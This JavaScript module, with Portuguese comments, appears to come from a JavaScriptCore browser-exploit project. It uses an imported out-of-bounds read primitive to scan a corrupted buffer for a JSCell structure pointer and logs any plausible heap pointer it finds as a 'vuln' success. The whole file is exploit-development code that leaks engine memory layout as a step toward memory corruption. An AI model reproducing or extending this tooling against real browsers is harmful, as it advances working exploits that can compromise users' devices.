// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO para R51 - Fuzzer de JSCell)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_JSCELL_FUZZER_R51 = "JSCell_OffsetFuzzer_R51";

// Função de leitura síncrona "leve".
function sync_oob_read_32(dataview, offset) {
    if (!dataview) return 0;
    return dataview.getUint32(offset, true);
}
function sync_oob_read_64_low(dataview, offset) { return sync_oob_read_32(dataview, offset); }
function sync_oob_read_64_high(dataview, offset) { return sync_oob_read_32(dataview, offset + 4); }


export async function executeJSCellFuzzer_R51() {
    const FNAME_CURRENT_TEST = FNAME_MODULE_JSCELL_FUZZER_R51;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Buscando dinamicamente o offset do JSCell ---`, "test", FNAME_CURRENT_TEST);
    
    let result = { success: false, msg: "Fuzzer não encontrou um offset de JSCell válido.", errorOccurred: null };

    try {
        // --- FASE 0: PREPARAÇÃO ---
        logS3(`--- Fase 0 (R51): Preparação do Ambiente OOB ---`, "subtest", FNAME_CURRENT_TEST);
        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-Setup` });
        const oob_dataview = getOOBDataView();
        if (!oob_dataview) throw new Error("Não foi possível obter o DataView da primitiva OOB.");
        logS3(`[R51] Ambiente OOB configurado.`, 'info');
        
        // --- FASE 1: LOOP DE FUZZING PARA O JSCELL ---
        logS3(`--- Fase 1 (R51): Buscando pelo JSCell do DataView no buffer OOB ---`, "subtest", FNAME_CURRENT_TEST);

        const structure_ptr_offset_in_cell = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET; // Geralmente 0x8
        const FUZZ_START_OFFSET = 0x20;
        const FUZZ_END_OFFSET = 0x200; // O JSCell deve estar perto do início do buffer
        const FUZZ_STEP = 0x8; // Células são alinhadas em 8 bytes

        for (let offset_guess = FUZZ_START_OFFSET; offset_guess < FUZZ_END_OFFSET; offset_guess += FUZZ_STEP) {
            
            const struct_ptr_read_offset = offset_guess + structure_ptr_offset_in_cell;
            
            // Lê o candidato a ponteiro de estrutura
            const struct_ptr_low = sync_oob_read_64_low(oob_dataview, struct_ptr_read_offset);
            const struct_ptr_high = sync_oob_read_64_high(oob_dataview, struct_ptr_read_offset);

            // Validação de um ponteiro de heap plausível
            // 1. Não pode ser nulo.
            // 2. A parte alta não pode ser nula (aponta para a memória alta).
            // 3. A parte baixa deve ser alinhada (geralmente em 8 bytes, então termina em 0 ou 8).
            if (struct_ptr_high > 0 && (struct_ptr_low % 8 === 0)) {
                // Encontramos um candidato forte!
                result.success = true;
                result.msg = `Candidato forte a JSCell encontrado no offset: ${toHex(offset_guess)}. Ponteiro de Estrutura: ${toHex(struct_ptr_high)}_${toHex(struct_ptr_low)}`;
                logS3(`[Fuzzer] SUCESSO! ${result.msg}`, 'vuln');
                break; // Encontrou, sai do loop
            }
        }

        if (!result.success) {
             throw new Error(`Fuzzer completou a faixa sem encontrar um candidato a JSCell válido.`);
        }

    } catch (e_outer) {
        result.errorOccurred = e_outer;
        result.msg = e_outer.message;
        logS3(`  CRITICAL ERROR (R51): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
        console.error("Outer error in R51 Fuzzer:", e_outer);
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
    return result;
}
